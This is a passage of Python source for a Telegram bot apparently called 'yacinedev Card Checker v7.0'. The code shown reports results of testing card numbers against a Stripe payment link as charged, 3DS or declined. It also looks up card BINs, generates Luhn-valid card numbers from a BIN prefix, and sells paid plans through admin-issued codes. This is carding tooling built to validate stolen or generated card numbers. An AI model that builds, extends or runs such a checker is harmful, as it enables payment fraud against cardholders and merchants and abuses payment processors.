            status_text = "3DS Required"
            status_icon = "[~]"
            response_text = "3DS OTP"
        else:
            udata["declined"] += 1
            status_text = "DECLINED"
            status_icon = "[-]"
            response_text = msg

        udata["history"].append({"card": card_str, "result": msg, "success": success, "time": datetime.now().strftime("%H:%M:%S")})

        output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
-------------------------------
{status_icon} Card: <code>{card_str}</code>
{status_icon} Status: {status_text}
{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
-------------------------------
{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
{status_icon} Bank: {bin_bank} - {bin_emoji}
{status_icon} Country: {bin_country} [ {bin_emoji} ]
-------------------------------
{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
{status_icon} Price: Free
{status_icon} By: yacinedev Checker
-------------------------------
{status_icon} Dev: @yacine_X6"""

        await status_msg.edit_text(output, parse_mode="HTML")

    except Exception as e:
        await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")

async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/bin 424242</code>", parse_mode="HTML")
        return
    bin_num = context.args[0].strip()
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text(f"{fb('Invalid BIN! Use 6+ digits.')}", parse_mode="HTML")
        return
    status_msg = await update.message.reply_text(f"{fb('Looking up BIN')} {bin_num}...", parse_mode="HTML")
    
    info = bin_lookup_with_cache(bin_num)
    
    text = f"""{fb('BIN Lookup')}: <code>{bin_num[:6]}</code>
━━━━━━━━━━━━━━
{fb('Scheme')}: <b>{info['scheme']}</b>
{fb('Type')}: <b>{info['type']}</b>
{fb('Brand')}: <b>{info['brand']}</b>
{fb('Country')}: <b>{info['country']}</b> {info['emoji']}
{fb('Bank')}: <b>{info['bank']}</b>
━━━━━━━━━━━━━━"""
    await status_msg.edit_text(text, parse_mode="HTML")

async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"{fb('Usage')}: <code>/gen 424242 [count]</code>\n{fb('Max 10 cards.')}", parse_mode="HTML")
        return
    bin_prefix = context.args[0].strip()
    count = int(context.args[1]) if len(context.args) > 1 and context.args[1].isdigit() else 10
    count = min(count, 10)
    cards = gen_card_from_bin(bin_prefix, count)
    if not cards:
        await update.message.reply_text(f"{fb('Could not generate cards. Check BIN.')}", parse_mode="HTML")
        return
    cards_text = "\n".join([f"├─ <code>{c}</code>" for c in cards])
    text = f"""{fb('Card Generator')}
━━━━━━━━━━━━━━
{fb('BIN')}: <code>{bin_prefix}</code>
{fb('Generated')}: <b>{len(cards)}</b>

{cards_text}
└─
━━━━━━━━━━━━━━
{fb('All cards pass Luhn check.')}"""
    await update.message.reply_text(text, parse_mode="HTML")

# ============================================================
# BUTTON HANDLERS
# ============================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # التحقق من الحظر
    if user_id in banned_users and data not in ["menu", "start"]:
        await query.message.reply_text(fb("You are banned!"))
        return

    if data == "menu":
        user = update.effective_user
        username = f"@{user.username}" if user.username else "N/A"
        udata = get_user(user_id)
        plan = udata["plan"]
        if user_id == ADMIN_ID: plan = "Admin"
        text = f"""{fb('Welcome')} {user.first_name}!
━━━━━━━━━━━━━━
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Status')}: {fb(plan)}
━━━━━━━━━━━━━━
{fb('Use the buttons below to navigate.')}"""
        send_colored_buttons(chat_id, text, build_main_menu())

    elif data == "tools":
        text = f"{fb('Tools Menu')}\n\n{fb('Select a tool or use commands directly.')}"
        send_colored_buttons(chat_id, text, build_tools_menu())

    elif data == "profile":
        user = update.effective_user
        username = f"@{user.username}" if user.username else "N/A"
        udata = get_user(user_id)
        plan = udata["plan"]
        if user_id == ADMIN_ID: plan = "Admin"
        text = f"""{fb('Profile')}
━━━━━━━━━━━━━━
{fb('Name')}: {user.first_name}
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Plan')}: {fb(plan)}
{fb('Checks')}: {udata['checks']}
{fb('Charged')}: {udata['charged']}
{fb('Declined')}: {udata['declined']}
{fb('3DS')}: {udata['_3ds']}
{fb('Joined')}: {udata['registered']}
━━━━━━━━━━━━━━"""
        buttons = [[b_blue(fb("Back"), "menu")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "settings":
        text = f"{fb('Settings')}\n\n{fb('Configure bot settings')}"
        send_colored_buttons(chat_id, text, build_settings_menu())

    elif data == "about":
        text = f"""{fb('yacinedev Card Checker v7.0')}

├─ {fb('Engine')}: Stripe Payment Link Engine
├─ {fb('Version')}: 7.0
├─ {fb('Performance')}: Async | Multi-threading
├─ {fb('Security')}: Proxy Rotation | BIN Cache | Ban System
│
├─ {fb('Developer')}: yacinedev
└─ {fb('Built with precision.')}"""
        buttons = [[b_blue(fb("Back"), "menu")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "admin_panel":
        if str(user_id) != str(ADMIN_ID):
            await query.answer(fb("Admin only!"), show_alert=True)
            return
        text = f"{fb('Admin Panel')}\n\n{fb('Select an option:')}"
        send_colored_buttons(chat_id, text, build_admin_menu())

    elif data == "admin_gen":
        if str(user_id) != str(ADMIN_ID):
            await query.answer(fb("Admin only!"), show_alert=True)
            return
        await query.message.reply_text(
            f"{fb('Generate Code')}\n\n"
            f"{fb('Usage')}: <code>/code Premium 30</code>\n"
            f"{fb('Example')}: <code>/code Premium 30</code> - generates 30-day Premium code\n"
            f"{fb('Plan options')}: Free, Premium, VIP",
